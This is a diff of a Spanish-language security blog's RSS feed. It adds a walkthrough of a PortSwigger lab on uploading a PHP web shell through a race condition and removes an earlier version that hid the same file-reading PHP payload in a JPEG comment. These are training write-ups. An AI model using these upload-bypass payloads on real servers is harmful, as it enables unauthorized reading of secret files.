@@ -6,7 +6,164 @@
         <description>Recent content on A1ux</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>es-GT</language>
-        <lastBuildDate>Tue, 11 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 13 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Portswigger Academy Learning Path: File Upload Lab 8</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/</link>
+        <pubDate>Thu, 13 Jan 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/head.png" alt="Featured image of post Portswigger Academy Learning Path: File Upload Lab 8" /&gt;&lt;h1 id=&#34;lab-web-shell-upload-via-race-condition&#34;&gt;Lab: Web shell upload via race condition&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es subir una shell al servidor para luego poder extraer o recuperar informacion de este. En este caso tenemos que leer el archivo &lt;code&gt;/home/carlos/secret&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Cuando ingresamos con la cuenta de &lt;code&gt;wiener:peter&lt;/code&gt; tenemos una opcion para subir archivos, en este caso el avatar del usuario, pero al intentar subir una imagen no nos da una opcion para poder elegir imagen u otro.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 142; 
+			flex-basis: 340px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/upload.png&#34; data-size=&#34;1200x845&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/upload.png&#34;
+			width=&#34;1200&#34;
+			height=&#34;845&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/upload_hubfff896f02667d728ec037f96a306033_47826_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/upload_hubfff896f02667d728ec037f96a306033_47826_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Sistema permite la subida de archivos&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Sistema permite la subida de archivos&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Todo bien pero el sistema parece que no ejecuta el codigo php desde la carpeta, haciendo que cualquier archivo php solo podamos ver el contenido del &lt;code&gt;php&lt;/code&gt; como si fuera texto plano.&lt;/p&gt;
+&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
+&lt;p&gt;Creamos el archivo php con el siguiente codigo&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/carlos/secret&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora se nos da el siguiente codigo para explicar que es lo que hace por atras el servidor y leyendolo entendemos que lo que hace es subir el archivo primero al servidor y ahi checarlo y validar, si es validado lo sube si no lo elimina, pero el principal problema es que se mantiene en el servidor por unos segundos el servicio. Por lo que nos podemos aprovechar de eso para explotarlo y subir directamente nuestro codigo php ya que hasta despues es validado.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$target_dir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;avatars/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_dir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;avatar&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;// temporary move
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;avatar&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;checkViruses&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;checkFileType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;The file &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; has been uploaded.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Sorry, there was an error uploading your file.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;http_response_code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;403&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;checkViruses&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;// checking for viruses
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;checkFileType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$imageFileType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pathinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fileName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PATHINFO_EXTENSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$imageFileType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$imageFileType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;png&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Sorry, only JPG &amp;amp; PNG files are allowed&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora que sabemos esto, lo que intentearemos es subir el archivo al servidor, para aprovechar ese pequeno tiempo subido y obtener la key. Pero antes vamos a configurar intruder para realizar peticiones indefinidamente.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 337; 
+			flex-basis: 810px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/intruder.png&#34; data-size=&#34;1907x565&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/intruder.png&#34;
+			width=&#34;1907&#34;
+			height=&#34;565&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/intruder_hu2576e7f087000cba7c5aaa45ca711eb6_74685_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/intruder_hu2576e7f087000cba7c5aaa45ca711eb6_74685_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Peticion get para la solicitud del archivo php&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Peticion get para la solicitud del archivo php&lt;/figcaption&gt;
+	
+&lt;/figure&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 161; 
+			flex-basis: 388px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/intruder2.png&#34; data-size=&#34;654x404&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/intruder2.png&#34;
+			width=&#34;654&#34;
+			height=&#34;404&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/intruder2_hu8a4257aed4a241c253166bef48ec81f6_17721_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/intruder2_hu8a4257aed4a241c253166bef48ec81f6_17721_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Ejecutar indefinidamente las peticiones con null payloads&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Ejecutar indefinidamente las peticiones con null payloads&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Despues de este paso subimos nuestro codigo php y esperamos a que salga en nuestro ataque&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Ahora lo ejecutamos y entre las respuestas podemos ver como se ejecuta el codigo php y se nos muestra la key, eso si por un corto tiempo.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 149; 
+			flex-basis: 358px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/key.png&#34; data-size=&#34;845x565&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/key.png&#34;
+			width=&#34;845&#34;
+			height=&#34;565&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/key_hu2f0e68108bcca1ca8c6646dd63a34546_38314_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/key_hu2f0e68108bcca1ca8c6646dd63a34546_38314_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Lectura de archivo secret de carlos&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Lectura de archivo secret de carlos&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Y con esto resolvimos el lab, pudiendo subir un archivo php que ejecuta acciones o comandos en el servidor.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 218; 
+			flex-basis: 524px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto.png&#34; data-size=&#34;1798x823&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto.png&#34;
+			width=&#34;1798&#34;
+			height=&#34;823&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto_hu94cc5e01d440733ecf72da15c16b9356_217779_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto_hu94cc5e01d440733ecf72da15c16b9356_217779_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
         <title>Portswigger Academy Learning Path: File Upload Lab 7</title>
         <link>https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-7/</link>
         <pubDate>Tue, 11 Jan 2022 00:00:00 +0000</pubDate>
@@ -163,169 +320,6 @@ Megapixels                      : 1.5
 &lt;ol&gt;
 &lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/section&gt;
-</description>
-        </item>
-        <item>
-        <title>Portswigger Academy Learning Path: File Upload Lab 8</title>
-        <link>https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/</link>
-        <pubDate>Tue, 11 Jan 2022 00:00:00 +0000</pubDate>
-        
-        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/</guid>
-        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/head.png" alt="Featured image of post Portswigger Academy Learning Path: File Upload Lab 8" /&gt;&lt;h1 id=&#34;lab-web-shell-upload-via-race-condition&#34;&gt;Lab: Web shell upload via race condition&lt;/h1&gt;
-&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es subir una shell al servidor para luego poder extraer o recuperar informacion de este. En este caso tenemos que leer el archivo &lt;code&gt;/home/carlos/secret&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
-&lt;p&gt;Cuando ingresamos con la cuenta de &lt;code&gt;wiener:peter&lt;/code&gt; tenemos una opcion para subir archivos, en este caso el avatar del usuario, pero al intentar subir una imagen no nos da una opcion para poder elegir imagen u otro.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	
-		class=&#34;gallery-image&#34; 
-		style=&#34;
-			flex-grow: 142; 
-			flex-basis: 340px&#34;
-	&gt;
-	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/upload.png&#34; data-size=&#34;1200x845&#34;&gt;
-		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/upload.png&#34;
-			width=&#34;1200&#34;
-			height=&#34;845&#34;
-			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/upload_hubfff896f02667d728ec037f96a306033_47826_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/upload_hubfff896f02667d728ec037f96a306033_47826_1024x0_resize_box_3.png 1024w&#34;
-			loading=&#34;lazy&#34;
-			alt=&#34;Sistema permite la subida de archivos&#34;&gt;
-	&lt;/a&gt;
-	
-	&lt;figcaption&gt;Sistema permite la subida de archivos&lt;/figcaption&gt;
-	
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;Todo bien pero el sistema parece que no ejecuta el codigo php desde la carpeta, haciendo que cualquier archivo php solo podamos ver el contenido del &lt;code&gt;php&lt;/code&gt; como si fuera texto plano.&lt;/p&gt;
-&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
-&lt;p&gt;Creamos el archivo php con el siguiente codigo&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/carlos/secret&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora enviamos el archivo, y vemos la respuesta que nos da diciendo que no se permite subir archivos de tipo &lt;code&gt;php&lt;/code&gt; solamente &lt;code&gt;jpg y png&lt;/code&gt;  aun cuando le agregamos las cabeceras para que sea un archivo de tipo jpg o png&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/List_of_file_signatures&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://en.wikipedia.org/wiki/List_of_file_signatures&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;figure 
-	
-		class=&#34;gallery-image&#34; 
-		style=&#34;
-			flex-grow: 173; 
-			flex-basis: 417px&#34;
-	&gt;
-	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/request.png&#34; data-size=&#34;1453x836&#34;&gt;
-		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/request.png&#34;
-			width=&#34;1453&#34;
-			height=&#34;836&#34;
-			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/request_hua582e73131976041b5307ff163e1d469_129394_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/request_hua582e73131976041b5307ff163e1d469_129394_1024x0_resize_box_3.png 1024w&#34;
-			loading=&#34;lazy&#34;
-			alt=&#34;Subida de archivo php al servidor&#34;&gt;
-	&lt;/a&gt;
-	
-	&lt;figcaption&gt;Subida de archivo php al servidor&lt;/figcaption&gt;
-	
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;Despues de intentar tanto encontre algo de exiftool y agregar un comentario en el blog de hacktricks, asi que me decidi a agregar un comentario a una imagen jpg cualquiera.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/pentesting-web/file-upload&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://book.hacktricks.xyz/pentesting-web/file-upload&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;alux@rootsystems:~/portswigger$ exiftool -Comment&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php echo file_get_contents(&amp;#39;/home/carlos/secret&amp;#39;); ?&amp;gt;&amp;#34;&lt;/span&gt; imagen.jpg
-    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; image files updated
-alux@rootsystems:~/portswigger$ exiftool imagen.jpg
-ExifTool Version Number         : 12.30
-File Name                       : imagen.jpg
-Directory                       : .
-File Size                       : &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; KiB
-File Modification Date/Time     : 2022:01:11 20:55:52-06:00
-File Access Date/Time           : 2022:01:11 20:55:52-06:00
-File Inode Change Date/Time     : 2022:01:11 20:55:52-06:00
-File Permissions                : -rw-r--r--
-File Type                       : JPEG
-File Type Extension             : jpg
-MIME Type                       : image/jpeg
-JFIF Version                    : 1.01
-Resolution Unit                 : inches
-X Resolution                    : &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt;
-Y Resolution                    : &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt;
-Comment                         : &amp;lt;?php &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; file_get_contents&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/carlos/secret&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; ?&amp;gt;
-Image Width                     : &lt;span class=&#34;m&#34;&gt;1080&lt;/span&gt;
-Image Height                    : &lt;span class=&#34;m&#34;&gt;1350&lt;/span&gt;
-Encoding Process                : Progressive DCT, Huffman coding
-Bits Per Sample                 : &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
-Color Components                : &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
-Y Cb Cr Sub Sampling            : YCbCr4:2:0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-Image Size                      : 1080x1350
-Megapixels                      : 1.5
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora que tenemos nuestra imagen jpg con un comentario, procedemos a subirlo, pero esta vez interceptando y no modificando nada, mas que el &lt;code&gt;filename&lt;/code&gt; y &lt;code&gt;Content-type&lt;/code&gt; para que se suban como archivos php y que el servidor no lo tome como imagen aunque si valide su cabecera y sea realmente una imagen pero al ingresar al servidor todo su texto legible se tomara como php.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	
-		class=&#34;gallery-image&#34; 
-		style=&#34;
-			flex-grow: 164; 
-			flex-basis: 395px&#34;
-	&gt;
-	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/request1.png&#34; data-size=&#34;1446x877&#34;&gt;
-		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/request1.png&#34;
-			width=&#34;1446&#34;
-			height=&#34;877&#34;
